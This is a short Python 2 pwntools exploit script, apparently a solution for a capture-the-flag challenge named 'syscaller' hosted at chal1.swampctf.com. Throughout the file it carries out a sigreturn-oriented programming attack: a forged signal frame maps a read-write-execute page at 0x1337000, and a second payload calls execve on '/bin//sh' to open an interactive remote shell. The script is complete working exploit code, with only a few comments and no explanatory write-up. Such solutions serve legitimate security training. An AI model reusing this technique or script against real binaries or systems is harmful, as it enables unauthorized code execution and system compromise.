#!/usr/bin/env python2


from pwn import *
context.arch = 'amd64'
# do srop:
# setup mmap(0x1337000), set RSP to 0x1337000
# then rip = 0x400104 (syscall instruction), insert /bin/sh @ 0x1337000 and do execve

#r = process("./syscaller")
r = remote("chal1.swampctf.com", 1800)
frame = SigreturnFrame()
frame.rax = constants.SYS_mmap
frame.rdi = 0x1337000
frame.rsi = 0x1000
frame.rdx = 7
frame.r10 = constants.MAP_PRIVATE | constants.MAP_ANONYMOUS | constants.MAP_FIXED
frame.r8 = -1
frame.r9 = 0
frame.rip = 0x400104
frame.rsp = 0x1337000
# now do the buffer, call sigreturn
buf = p64(0) # r12
buf += p64(0) # r11
buf += p64(0) # rdi
buf += p64(constants.SYS_rt_sigreturn) # rax
buf += p64(0) # rbx
buf += p64(0) # rdx
buf += p64(0) # rsi
buf += p64(0) # rdi
buf += str(frame)

r.send(buf)

# now send our execve shellcode
buf = "/bin//sh" # r12
buf += p64(0) # r11
buf += p64(0x1337000) # rdi
buf += p64(constants.SYS_execve) # rax
buf += p64(0) # rbx
buf += p64(0) # rdx
buf += p64(0) # rsi
buf += p64(0x1337000) # rdi
r.send(buf)
r.interactive()
